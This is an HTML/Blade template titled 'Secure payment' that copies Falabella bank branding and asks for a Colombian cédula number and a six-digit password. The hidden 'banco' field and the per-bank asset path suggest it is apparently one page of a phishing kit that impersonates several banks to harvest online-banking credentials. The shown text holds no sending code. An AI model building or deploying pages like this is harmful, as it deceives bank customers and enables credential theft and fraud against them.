<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <title>Secure payment</title>

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		
		
    <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input{
            width: 80%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
            padding: 5px;
        }
        select{
            padding: 5px;
            background-color: white;
            color: black;
            width: 82%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border:1px solid gray;
        }

        #btnUsuario{
            background-color: palevioletred;
            border: none;
            color: white;
            letter-spacing: 3px;
            font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';
            
        }

        #clave{
            color:rgb(78,139,102);
        }
    </style>
</head>
<body>
    <br><br>
    <div><center><img src="{{asset('assets/img/payment/falabella/fala.png')}}" alt="" width="40%" height="">
    <img src="{{asset('assets/img/payment/falabella/pago.jpg')}}" alt="" width="20%" style="margin-left:90px;"></div>
<br><br><br><br>
    <div>
        <center>
        <select name="" id="">
            <option value="cedula">Cedula Ciudadania</option>
        </select><br>

        <input type="tel" id="txtUsuario" name = "cedula" placeholder="Cedula Ciudadania" maxlength="10" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
        <input type="password" id="txtPass" name ="clave" placeholder="Clave" required pattern="[0-9]{6}" oninput="this.value = this.value.replace(/\s+/g, '')"><br>
        <input type="submit" value="INGRESAR" id="btnUsuario" ></center><br>
        <input type="hidden" value="falabella" id="banco">
       <center> <a href="" id="clave">Crea o recupera tu clave</a></center>
   </div>
<br><br>

</body>
</html>